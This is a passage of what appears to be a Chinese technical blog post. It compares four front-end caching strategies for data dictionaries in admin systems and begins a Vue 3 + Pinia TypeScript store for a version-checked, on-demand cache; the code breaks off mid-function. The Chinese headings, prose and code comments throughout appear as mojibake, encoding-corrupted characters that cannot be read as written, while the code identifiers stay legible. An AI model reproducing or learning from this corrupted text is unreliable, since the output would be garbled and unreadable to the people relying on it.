ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"â€¢";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨åå°ä¸ä¸­å°ç³»ç»Ÿå¼€å‘é¢†åŸŸï¼Œæ•°æ®å­—å…¸æ˜¯æä¸ºå¸¸è§ä¸”è‡³å…³é‡è¦çš„æ¦‚å¿µï¼Œç›¸ä¿¡å¤§å¤šæ•°ä»äº‹ç›¸å…³å¼€å‘å·¥ä½œçš„æœ‹å‹éƒ½å¯¹å…¶è€³ç†Ÿèƒ½è¯¦ã€‚å‡ ä¹æ¯ä¸€ä¸ªæˆç†Ÿçš„é¡¹ç›®ï¼Œéƒ½ä¼šä¸“é—¨è®¾ç½®ä¸€ä¸ªå­—å…¸æ¨¡å—ï¼Œç”¨äºç²¾å¿ƒç»´æŠ¤å„ç±»å­—å…¸æ•°æ®ã€‚è¿™äº›å­—å…¸æ•°æ®åœ¨ç³»ç»Ÿä¸­æ‰®æ¼”ç€ä¸¾è¶³è½»é‡çš„è§’è‰²ï¼Œä¸ºä¸‹æ‹‰æ¡†ã€è½¬ä¹‰å€¼ã€å•é€‰æŒ‰é’®ç­‰ç»„ä»¶æä¾›äº†ä¸å¯æˆ–ç¼ºçš„åŸºç¡€æ•°æ®æ”¯æ’‘ã€‚</p>
<p>æˆ‘è‡ªå·¥ä½œä»¥æ¥å‚ä¸è¿‡å¾ˆå¤šä¸ªé¡¹ç›®ï¼Œæ—¢æœ‰ä»é›¶å¼€å§‹æ­å»ºçš„ï¼Œä¹Ÿæœ‰æ¥æ‰‹ä»–äººé¡¹ç›®çš„ã€‚åœ¨å®è·µè¿‡ç¨‹ä¸­ï¼Œæˆ‘å‘ç°ä¸åŒé¡¹ç›®å¯¹å­—å…¸çš„å®ç°æ–¹å¼å„ä¸ç›¸åŒï¼Œä¸”å„æœ‰ä¾§é‡ã€‚ä¾‹å¦‚ï¼Œå¯¹äºé¡¹ç›®ä¸­çš„å­—å…¸åŸºæœ¬ä¸ä¼šå‘ç”Ÿå˜åŒ–çš„ï¼Œé¡¹ç›®é€šå¸¸ä¼šé‡‡ç”¨é¦–æ¬¡å…¨éƒ¨åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜çš„æ–¹å¼ã€‚è¿™ç§æ–¹å¼èƒ½æ˜¾è‘—èŠ‚çœç½‘ç»œè¯·æ±‚æ¬¡æ•°ï¼Œæå‡ç³»ç»Ÿå“åº”é€Ÿåº¦ã€‚ç„¶è€Œï¼Œå¯¹äºé¡¹ç›®ä¸­çš„å­—å…¸ç»å¸¸å˜åŠ¨çš„ï¼Œé¡¹ç›®åˆ™ä¼šé‡‡ç”¨æŒ‰éœ€åŠ è½½çš„æ–¹å¼ï¼Œå³å“ªé‡Œéœ€è¦ä½¿ç”¨å­—å…¸å€¼ï¼Œå°±åœ¨å“ªé‡Œè¿›è¡ŒåŠ è½½ã€‚ä½†è¿™ç§æ–¹å¼ä¹Ÿå­˜åœ¨å¼Šç«¯ï¼Œå½“æŸä¸ªé¡µé¢éœ€è¦ä½¿ç”¨åå¤šä¸ªå­—å…¸å€¼æ—¶ï¼Œé¦–æ¬¡è¿›å…¥é¡µé¢ä¼šä¸€æ¬¡æ€§å‘å‡ºåå¤šä¸ªè¯·æ±‚æ¥è·å–è¿™äº›å­—å…¸å€¼ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</p>
<h2 data-id="heading-1">å¸¸è§å­—å…¸æ–¹æ¡ˆå‰–æ</h2>
<p>åœ¨å½“ä¸‹ï¼Œæ•°æ®å­—å…¸çš„å®ç°æ–¹æ¡ˆä¸°å¯Œå¤šæ ·ï¼Œå„æœ‰ä¼˜åŠ£ã€‚ä¸‹é¢å°†è¯¦ç»†ä»‹ç»å‡ ç§å¸¸è§çš„æ–¹æ¡ˆï¼Œå¹¶åˆ†æå…¶ç‰¹ç‚¹ã€‚æˆ‘å°†è¯¦ç»†ä»‹ç»å‡ ç§å¸¸è§çš„æ–¹æ¡ˆï¼Œå¹¶æ·±å…¥å‰–æå…¶ç‰¹ç‚¹ã€‚è¿™å‡ ç§æ–¹æ¡ˆçš†æ˜¯æˆ‘é€šè¿‡å®è·µç²¾å¿ƒæ€»ç»“è€Œæ¥ï¼Œå…¶ä¸­æ–¹æ¡ˆå››çš„æ€è·¯æ˜¯ç”±<a href="https://juejin.cn/user/78820570050190" target="_blank" title="https://juejin.cn/user/78820570050190">æˆ‘ä¸çˆ±åƒé±¼å•¦</a>æä¾›ã€‚</p>
<h3 data-id="heading-2">æ–¹æ¡ˆä¸€ï¼šé¦–æ¬¡å…¨éƒ¨åŠ è½½åˆ°æœ¬åœ°è¿›è¡Œç¼“å­˜</h3>
<h4 data-id="heading-3">æ–¹æ¡ˆæè¿°</h4>
<p>ç³»ç»Ÿå¯åŠ¨æˆ–ç”¨æˆ·é¦–æ¬¡è®¿é—®æ—¶ï¼Œå°†æ‰€æœ‰å­—å…¸æ•°æ®ä¸€æ¬¡æ€§åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜ä¸­ã€‚åç»­ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è·å–æ‰€éœ€å­—å…¸æ•°æ®ï¼Œæ— éœ€å†æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p>
<h4 data-id="heading-4">ä¼˜ç‚¹</h4>
<ul>
<li><strong>è®¿é—®é€Ÿåº¦å¿«</strong>ï¼šåç»­è®¿é—®æ—¶ç›´æ¥ä»æœ¬åœ°ç¼“å­˜è¯»å–æ•°æ®ï¼Œæ— éœ€ç­‰å¾…ç½‘ç»œè¯·æ±‚ï¼Œå“åº”é€Ÿåº¦æå¿«ã€‚</li>
<li><strong>å‡å°‘ç½‘ç»œè¯·æ±‚</strong>ï¼šä¸€æ¬¡æ€§åŠ è½½åï¼Œåç»­ä½¿ç”¨æ— éœ€é¢‘ç¹å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œé™ä½äº†ç½‘ç»œå¼€é”€ã€‚</li>
<li><strong>ç½‘ç»œä¾èµ–å°</strong>ï¼šå³ä½¿åœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨å·²ç¼“å­˜çš„å­—å…¸æ•°æ®ï¼Œä¿è¯äº†ç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚</li>
</ul>
<h4 data-id="heading-5">ç¼ºç‚¹</h4>
<ul>
<li><strong>é¦–æ¬¡åŠ è½½æ—¶é—´é•¿</strong>ï¼šè‹¥å­—å…¸æ•°æ®é‡è¾ƒå¤§ï¼Œé¦–æ¬¡åŠ è½½æ—¶å¯èƒ½éœ€è¦è¾ƒé•¿æ—¶é—´ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>å ç”¨å­˜å‚¨ç©ºé—´</strong>ï¼šå°†æ‰€æœ‰å­—å…¸æ•°æ®å­˜å‚¨åœ¨æœ¬åœ°ï¼Œä¼šå ç”¨è¾ƒå¤šçš„æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œå°¤å…¶æ˜¯å½“å­—å…¸æ•°æ®é‡åºå¤§æ—¶ã€‚</li>
<li><strong>ç¼“å­˜æ›´æ–°å¤æ‚</strong>ï¼šè‹¥å­—å…¸æ•°æ®é¢‘ç¹æ›´æ–°ï¼Œéœ€è¦è®¾è®¡å¤æ‚çš„ç¼“å­˜åŒæ­¥å’Œæ›´æ–°æœºåˆ¶ï¼Œå¦åˆ™å®¹æ˜“å‡ºç°æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-6">æ–¹æ¡ˆäºŒï¼šæŒ‰éœ€åŠ è½½ä¸ç¼“å­˜</h3>
<h4 data-id="heading-7">æ–¹æ¡ˆæè¿°</h4>
<p>å½“ç”¨æˆ·è§¦å‘ç‰¹å®šæ“ä½œï¼Œéœ€è¦ä½¿ç”¨å­—å…¸æ•°æ®æ—¶ï¼Œæ‰ä»åç«¯å®æ—¶åŠ è½½æ‰€éœ€æ•°æ®ï¼Œä¸”ä¸è¿›è¡Œæœ¬åœ°ç¼“å­˜ã€‚æ¯æ¬¡ä½¿ç”¨å­—å…¸æ•°æ®æ—¶ï¼Œéƒ½é‡æ–°ä»æœåŠ¡å™¨è·å–æœ€æ–°æ•°æ®ã€‚</p>
<h4 data-id="heading-8">ä¼˜ç‚¹</h4>
<ul>
<li><strong>èŠ‚çœå­˜å‚¨ç©ºé—´</strong>ï¼šä¸è¿›è¡Œæœ¬åœ°ç¼“å­˜ï¼ŒèŠ‚çœäº†æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œå°¤å…¶é€‚ç”¨äºå­˜å‚¨èµ„æºæœ‰é™çš„è®¾å¤‡ã€‚</li>
<li><strong>æ•°æ®å®æ—¶æ€§é«˜</strong>ï¼šæ¯æ¬¡è·å–çš„æ•°æ®éƒ½æ˜¯æœ€æ–°çš„ï¼Œä¸å­˜åœ¨ç¼“å­˜æ•°æ®ä¸åç«¯ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œä¿è¯äº†æ•°æ®çš„å‡†ç¡®æ€§ã€‚</li>
</ul>
<h4 data-id="heading-9">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç½‘ç»œè¯·æ±‚é¢‘ç¹</strong>ï¼šæ¯æ¬¡ä½¿ç”¨éƒ½éœ€è¦å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œåœ¨ç½‘ç»œçŠ¶å†µä¸ä½³æ—¶ï¼Œä¼šå¯¼è‡´åŠ è½½æ—¶é—´å˜é•¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</li>
<li><strong>å¢åŠ æœåŠ¡å™¨è´Ÿæ‹…</strong>ï¼šé¢‘ç¹çš„ç½‘ç»œè¯·æ±‚ä¼šå¢åŠ æœåŠ¡å™¨çš„è´Ÿæ‹…ï¼Œå°¤å…¶æ˜¯åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¯èƒ½å½±å“æœåŠ¡å™¨çš„æ€§èƒ½ã€‚</li>
</ul>
<h3 data-id="heading-10">æ–¹æ¡ˆä¸‰ï¼šé¦–æ¬¡æŒ‰éœ€åŠ è½½å¹¶ç¼“å­˜</h3>
<h4 data-id="heading-11">æ–¹æ¡ˆæè¿°</h4>
<p>ç”¨æˆ·é¦–æ¬¡è®¿é—®æŸä¸ªå­—å…¸æ•°æ®æ—¶ï¼Œä»åç«¯åŠ è½½è¯¥æ•°æ®å¹¶ç¼“å­˜åˆ°æœ¬åœ°ã€‚åç»­å†æ¬¡è®¿é—®è¯¥å­—å…¸æ•°æ®æ—¶ï¼Œç›´æ¥ä»ç¼“å­˜ä¸­è¯»å–ï¼Œæ— éœ€å†æ¬¡å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p>
<h4 data-id="heading-12">ä¼˜ç‚¹</h4>
<ul>
<li><strong>å‡å°‘ç½‘ç»œè¯·æ±‚</strong>ï¼šç»“åˆäº†å‰ä¸¤ç§æ–¹æ¡ˆçš„éƒ¨åˆ†ä¼˜ç‚¹ï¼Œæ—¢åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘äº†ç½‘ç»œè¯·æ±‚æ¬¡æ•°ï¼Œåˆä¸ä¼šä¸€æ¬¡æ€§åŠ è½½è¿‡å¤šæ•°æ®ã€‚</li>
<li><strong>èŠ‚çœå­˜å‚¨ç©ºé—´</strong>ï¼šç›¸è¾ƒäºé¦–æ¬¡å…¨éƒ¨åŠ è½½åˆ°æœ¬åœ°ç¼“å­˜çš„æ–¹å¼ï¼Œä¸ä¼šä¸€æ¬¡æ€§å ç”¨å¤§é‡æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼ŒèŠ‚çœäº†éƒ¨åˆ†å­˜å‚¨èµ„æºã€‚</li>
</ul>
<h4 data-id="heading-13">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç¼“å­˜ç®¡ç†å¤æ‚</strong>ï¼šéœ€è¦è®°å½•å“ªäº›æ•°æ®å·²ç¼“å­˜ï¼Œä»¥ä¾¿åç»­åˆ¤æ–­æ˜¯å¦éœ€è¦ä»ç¼“å­˜ä¸­è¯»å–æˆ–é‡æ–°åŠ è½½ï¼Œå¢åŠ äº†ç¼“å­˜ç®¡ç†çš„å¤æ‚åº¦ã€‚</li>
<li><strong>ç¼“å­˜å ç”¨é—®é¢˜</strong>ï¼šå¯¹äºä¸å¸¸ä½¿ç”¨çš„å­—å…¸æ•°æ®ï¼Œç¼“å­˜å¯èƒ½ä¼šå ç”¨ä¸å¿…è¦çš„å­˜å‚¨ç©ºé—´ï¼Œé€ æˆèµ„æºæµªè´¹ã€‚</li>
<li><strong>ç¼“å­˜æ›´æ–°éš¾é¢˜</strong>ï¼šåŒæ ·é¢ä¸´ç¼“å­˜æ›´æ–°çš„é—®é¢˜ï¼Œéœ€è¦è®¾è®¡åˆç†çš„ç¼“å­˜æ›´æ–°ç­–ç•¥ï¼Œä»¥ä¿è¯æ•°æ®çš„å‡†ç¡®æ€§å’Œä¸€è‡´æ€§ã€‚</li>
</ul>
<h3 data-id="heading-14">æ–¹æ¡ˆå››ï¼šæŒ‰éœ€åŠ è½½ + ç‰ˆæœ¬æ ¡éªŒæ›´æ–°ç¼“å­˜</h3>
<h4 data-id="heading-15">æ–¹æ¡ˆæè¿°</h4>
<p>ç”¨æˆ·æŒ‰éœ€å‘èµ·å­—å…¸æ•°æ®è¯·æ±‚ï¼Œé¦–æ¬¡è®¿é—®æŸä¸ªå­—å…¸æ•°æ®æ—¶ï¼Œä»åç«¯åŠ è½½å¹¶ç¼“å­˜åˆ°æœ¬åœ°ã€‚åœ¨åç«¯å“åº”å¤´ä¸­æºå¸¦è¯¥å­—å…¸æ•°æ®çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåç»­æ¯æ¬¡è¯·æ±‚è¯¥å­—å…¸æ•°æ®æ—¶ï¼Œå‰ç«¯å¯¹æ¯”æœ¬åœ°ç¼“å­˜çš„ç‰ˆæœ¬ä¿¡æ¯å’Œå“åº”å¤´ä¸­çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚è‹¥ç‰ˆæœ¬ä¿¡æ¯ä¸ä¸€è‡´ï¼Œåˆ™æ¸…é™¤æœ¬åœ°ç¼“å­˜ä¸­å¯¹åº”çš„å­—å…¸æ•°æ®ï¼Œå¹¶é‡æ–°ä»åç«¯åŠ è½½æœ€æ–°æ•°æ®ï¼›è‹¥ç‰ˆæœ¬ä¿¡æ¯ä¸€è‡´ï¼Œåˆ™ç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-16">ä¼˜ç‚¹</h4>
<ul>
<li><strong>æ•°æ®å®æ—¶æ€§æœ‰ä¿éšœ</strong>ï¼šé€šè¿‡ç‰ˆæœ¬æ ¡éªŒæœºåˆ¶ï¼Œèƒ½å¤ŸåŠæ—¶è·å–åˆ°å­—å…¸æ•°æ®çš„æ›´æ–°ï¼Œç¡®ä¿å‰ç«¯ä½¿ç”¨çš„æ•°æ®ä¸åç«¯ä¿æŒä¸€è‡´ï¼Œé¿å…äº†å› ç¼“å­˜æ•°æ®æœªåŠæ—¶æ›´æ–°è€Œå¯¼è‡´çš„ä¸šåŠ¡é—®é¢˜ã€‚</li>
<li><strong>å‡å°‘ä¸å¿…è¦çš„ç½‘ç»œè¯·æ±‚</strong>ï¼šåœ¨å­—å…¸æ•°æ®æœªæ›´æ–°æ—¶ï¼Œç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜ï¼Œæ— éœ€å‘èµ·ç½‘ç»œè¯·æ±‚ï¼ŒèŠ‚çœäº†ç½‘ç»œå¸¦å®½å’ŒæœåŠ¡å™¨èµ„æºã€‚</li>
<li><strong>å¹³è¡¡å­˜å‚¨ä¸æ€§èƒ½</strong>ï¼šæ—¢ä¸ä¼šåƒé¦–æ¬¡å…¨éƒ¨åŠ è½½é‚£æ ·å ç”¨å¤§é‡æœ¬åœ°å­˜å‚¨ç©ºé—´ï¼Œåˆèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå‡å°‘ç½‘ç»œè¯·æ±‚ï¼Œåœ¨å­˜å‚¨å’Œæ€§èƒ½ä¹‹é—´å–å¾—äº†è¾ƒå¥½çš„å¹³è¡¡ã€‚</li>
</ul>
<h4 data-id="heading-17">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç‰ˆæœ¬ç®¡ç†å¤æ‚</strong>ï¼šåç«¯éœ€è¦ç»´æŠ¤å­—å…¸æ•°æ®çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¹¶ä¸”è¦ç¡®ä¿ç‰ˆæœ¬å·çš„å‡†ç¡®æ€§å’Œå”¯ä¸€æ€§ï¼Œè¿™å¢åŠ äº†åç«¯å¼€å‘çš„å¤æ‚åº¦å’Œç»´æŠ¤æˆæœ¬ã€‚</li>
<li><strong>é¢å¤–å¼€é”€</strong>ï¼šæ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦è¿›è¡Œç‰ˆæœ¬ä¿¡æ¯å¯¹æ¯”æ“ä½œï¼Œè™½ç„¶å¼€é”€è¾ƒå°ï¼Œä½†åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå¯èƒ½ä¼šå¯¹ç³»ç»Ÿæ€§èƒ½äº§ç”Ÿä¸€å®šå½±å“ã€‚</li>
<li><strong>é¦–æ¬¡åŠ è½½ä½“éªŒ</strong>ï¼šé¦–æ¬¡åŠ è½½å­—å…¸æ•°æ®æ—¶ï¼Œä¾ç„¶éœ€è¦ä»åç«¯è·å–æ•°æ®ï¼Œè‹¥æ•°æ®é‡è¾ƒå¤§æˆ–ç½‘ç»œçŠ¶å†µä¸ä½³ï¼Œå¯èƒ½ä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚</li>
</ul>
<h3 data-id="heading-18">æ–¹æ¡ˆé€‰å‹å»ºè®®</h3>
<p>å»ºè®®æ ¹æ®é¡¹ç›®ç‰¹æ€§é€‰æ‹©æ–¹æ¡ˆï¼Œæ²¡æœ‰æœ€å¥½çš„æŠ€æœ¯æ–¹æ¡ˆï¼Œåªæœ‰æœ€é€‚åˆé¡¹ç›®çš„æŠ€æœ¯æ–¹æ¡ˆï¼š</p>
<ul>
<li><strong>å­—å…¸ç¨³å®šä¸”é‡å°</strong>ï¼šæ–¹æ¡ˆä¸€å…¨é‡ç¼“å­˜</li>
<li><strong>å­—å…¸é¢‘ç¹æ›´æ–°</strong>ï¼šæ–¹æ¡ˆå››ç‰ˆæœ¬æ ¡éªŒç¼“å­˜</li>
<li><strong>å­˜å‚¨æ•æ„Ÿåœºæ™¯</strong>ï¼šæ–¹æ¡ˆä¸‰æŒ‰éœ€ç¼“å­˜</li>
<li><strong>å®æ—¶æ€§è¦æ±‚æé«˜</strong>ï¼šæ–¹æ¡ˆäºŒæ— ç¼“å­˜æ–¹æ¡ˆ</li>
</ul>
<blockquote>
<p>psï¼šå¦‚æœå¤§å®¶æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œä¹Ÿå¯ä»¥åœ¨è¯„è®ºåŒºæå‡ºï¼Œè®©æˆ‘ä»¬å¤§å®¶ä¸€èµ·å­¦ä¹ æˆé•¿</p>
</blockquote>
<h2 data-id="heading-19">ä»£ç å®ç°ï¼ˆæ–¹æ¡ˆå››ï¼‰</h2>
<p>ä¸‹è¿°ä»£ç çš„å®ç°åŸºäºvue3+piniaï¼Œè¯¥ä»£ç å®ç°äº†ç»Ÿä¸€ç®¡ç†å…¨å±€å­—å…¸æ•°æ®ï¼Œæ”¯æŒæŒ‰éœ€åŠ è½½ã€ç¼“å­˜å¤ç”¨ã€ç‰ˆæœ¬æ§åˆ¶ã€åŠ¨æ€æ›´æ–°ã€æ‰¹é‡å¤„ç†å­—å…¸æ•°æ®ç­‰åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-20">pinia storeçš„å®ç°</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { getDictDetails, <span class="hljs-keyword">type</span> <span class="hljs-title class_">Details</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/api/system/dict'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useDictStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'dict'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å­˜å‚¨å­—å…¸æ•°æ®ï¼Œé”®ä¸ºå­—å…¸åç§°ï¼Œå€¼ä¸ºå­—å…¸è¯¦æƒ…æ•°ç»„</span>
    <span class="hljs-keyword">const</span> dictData = ref&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt;&gt;({})
    <span class="hljs-comment">// å­˜å‚¨å­—å…¸ç‰ˆæœ¬ä¿¡æ¯ï¼Œé”®ä¸ºå­—å…¸åç§°ï¼Œå€¼ä¸ºç‰ˆæœ¬å·</span>
    <span class="hljs-keyword">const</span> dictVersions = ref&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">''</span>)

    <span class="hljs-comment">/**
     * æ›´æ–°å­—å…¸ç‰ˆæœ¬ä¿¡æ¯
     * <span class="hljs-doctag">@param</span> version æ–°çš„å­—å…¸ç‰ˆæœ¬å·
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateDictVersion</span> = (<span class="hljs-params">version: <span class="hljs-built_in">string</span></span>) =&gt; {
        dictVersions.<span class="hljs-property">value</span> = version
    }

    <span class="hljs-comment">/**
     * è·å–å­—å…¸ç‰ˆæœ¬
     * <span class="hljs-doctag">@returns</span> å­—å…¸ç‰ˆæœ¬å·
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictVersion</span> = (<span class="hljs-params"/>) =&gt; {
        <span class="hljs-keyword">return</span> dictVersions.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * åŠ è½½å­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> dictNames å­—å…¸åç§°æ•°ç»„
     * <span class="hljs-doctag">@returns</span> åŠ è½½çš„å­—å…¸æ•°æ®å¯¹è±¡
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">dictNames: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(dictNames)) {
                <span class="hljs-keyword">return</span> {};
            }
            <span class="hljs-comment">// è¿‡æ»¤å¹¶å»é‡æœ‰æ•ˆå­—å…¸åç§°</span>
            <span class="hljs-keyword">const</span> uniqueNames = [...<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(dictNames.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> 
                <span class="hljs-keyword">typeof</span> name === <span class="hljs-string">'string'</span> &amp;&amp; name.<span class="hljs-title function_">trim</span>()
            ))];
            
            <span class="hljs-keyword">if</span> (uniqueNames.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">return</span> {};
            }

            <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Details</span>[]&gt; = {};
            <span class="hljs-keyword">const</span> <span class="hljs-attr">unloadedDicts</span>: <span class="hljs-built_in">string</span>[] = [];

            <span class="hljs-comment">// åˆ†ç¦»å·²åŠ è½½å’ŒæœªåŠ è½½çš„å­—å…¸</span>
            dictNames.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
                <span class="hljs-keyword">if</span> (dictData.<span class="hljs-property">value</span>[name]) {
                    result[name] = dictData.<span class="hljs-property">value</span>[name];
                } <span class="hljs-keyword">else</span> {
                    unloadedDicts.<span class="hljs-title function_">push</span>(name);
                }
            });

            <span class="hljs-comment">// å¦‚æœæœ‰æœªåŠ è½½çš„å­—å…¸ï¼Œä»æ¥å£è¯·æ±‚è·å–</span>
            <span class="hljs-keyword">if</span> (unloadedDicts.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDictDetails</span>(unloadedDicts);

                <span class="hljs-comment">// åˆå¹¶æ–°åŠ è½½çš„æ•°æ®åˆ°ç»“æœ</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(result, data);

                <span class="hljs-comment">// æ›´æ–°å…¨å±€å­—å…¸ç¼“å­˜</span>
                <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(dictData.<span class="hljs-property">value</span>, data);
            }

            <span class="hljs-keyword">return</span> result;
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½å­—å…¸æ•°æ®å¤±è´¥:'</span>, error);
            <span class="hljs-keyword">return</span> {};
        }
    };

    <span class="hljs-comment">/**
     * æ ¹æ®å­—å…¸åç§°è·å–å­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     * <span class="hljs-doctag">@returns</span> å­—å…¸è¯¦æƒ…æ•°ç»„
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">return</span> dictData.<span class="hljs-property">value</span>[name] || []
    }

    <span class="hljs-comment">/**
     * æ ¹æ®å­—å…¸åç§°å’Œå€¼è·å–å­—å…¸æ ‡ç­¾
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     * <span class="hljs-doctag">@param</span> value å­—å…¸å€¼
     * <span class="hljs-doctag">@returns</span> å­—å…¸æ ‡ç­¾
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">value</span> === value)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">label</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * æ ¹æ®å­—å…¸åç§°å’Œæ ‡ç­¾è·å–å­—å…¸å€¼
     * <span class="hljs-doctag">@param</span> name å­—å…¸åç§°
     * <span class="hljs-doctag">@param</span> label å­—å…¸æ ‡ç­¾
     * <span class="hljs-doctag">@returns</span> å­—å…¸å€¼
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictValue</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, label: <span class="hljs-built_in">string</span></span>) =&gt; {
        <span class="hljs-keyword">const</span> dict = <span class="hljs-title function_">getDict</span>(name)
        <span class="hljs-keyword">const</span> item = dict.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">label</span> === label)
        <span class="hljs-keyword">return</span> item?.<span class="hljs-property">value</span> || <span class="hljs-string">''</span>
    }

    <span class="hljs-comment">/**
     * æ¸…é™¤æŒ‡å®šå­—å…¸æ•°æ®
     * <span class="hljs-doctag">@param</span> names å­—å…¸åç§°
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">clearDicts</span> = (<span class="hljs-params">names: <span class="hljs-built_in">string</span>[]</span>) =&gt; {
        names.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> {
